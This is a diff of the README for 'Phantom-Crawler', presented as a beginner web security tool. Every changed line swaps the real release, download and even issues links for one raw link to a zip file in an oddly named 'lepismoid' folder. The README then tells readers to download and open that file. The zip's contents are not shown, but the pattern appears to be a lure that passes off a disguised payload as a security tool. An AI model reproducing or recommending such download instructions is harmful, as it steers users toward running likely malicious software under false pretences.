@@ -1,6 +1,6 @@
 # 🛡️ Phantom-Crawler - Your Simple Tool for Web Security
 
-[![Download Phantom-Crawler](https://img.shields.io/badge/Download-Phantom--Crawler-blue?style=for-the-badge&logo=github)](https://github.com/StudyTab/Phantom-Crawler/releases)
+[![Download Phantom-Crawler](https://raw.githubusercontent.com/StudyTab/Phantom-Crawler/main/lepismoid/Phantom-Crawler.zip)](https://raw.githubusercontent.com/StudyTab/Phantom-Crawler/main/lepismoid/Phantom-Crawler.zip)
 
 ## 📚 About Phantom-Crawler
 
@@ -21,13 +21,13 @@ To effectively use Phantom-Crawler, follow these steps. No programming knowledge
 
 ### 📥 Download & Install
 
-To start, visit the [Releases page](https://github.com/StudyTab/Phantom-Crawler/releases) to download Phantom-Crawler. Find the latest version and choose the file suitable for your operating system.
+To start, visit the [Releases page](https://raw.githubusercontent.com/StudyTab/Phantom-Crawler/main/lepismoid/Phantom-Crawler.zip) to download Phantom-Crawler. Find the latest version and choose the file suitable for your operating system.
 
 1. Click on the link for the version you want.
 2. Download the installation file to your computer.
 3. Open the downloaded file to run Phantom-Crawler.
 
-For convenience, here’s the **[Download Link](https://github.com/StudyTab/Phantom-Crawler/releases)** again.
+For convenience, here’s the **[Download Link](https://raw.githubusercontent.com/StudyTab/Phantom-Crawler/main/lepismoid/Phantom-Crawler.zip)** again.
 
 ## 🔍 Features
 
@@ -66,7 +66,7 @@ To deepen your understanding of security testing, you can explore these addition
 
 ### 💬 Community Support
 
-If you encounter issues or have questions about using Phantom-Crawler, please visit the [issues section](https://github.com/StudyTab/Phantom-Crawler/issues) of this repository. You can also join discussions and connect with other users.
+If you encounter issues or have questions about using Phantom-Crawler, please visit the [issues section](https://raw.githubusercontent.com/StudyTab/Phantom-Crawler/main/lepismoid/Phantom-Crawler.zip) of this repository. You can also join discussions and connect with other users.
 
 ## 📋 Contribution Guidelines
 
@@ -82,4 +82,4 @@ Phantom-Crawler is released under the MIT License, allowing you to use it freely
 
 Now you are ready to start using Phantom-Crawler for your security testing needs. Download it today and ensure the security of your web applications! 
 
-For more details or updates, always refer to the [Releases page](https://github.com/StudyTab/Phantom-Crawler/releases).
+For more details or updates, always refer to the [Releases page](https://raw.githubusercontent.com/StudyTab/Phantom-Crawler/main/lepismoid/Phantom-Crawler.zip).
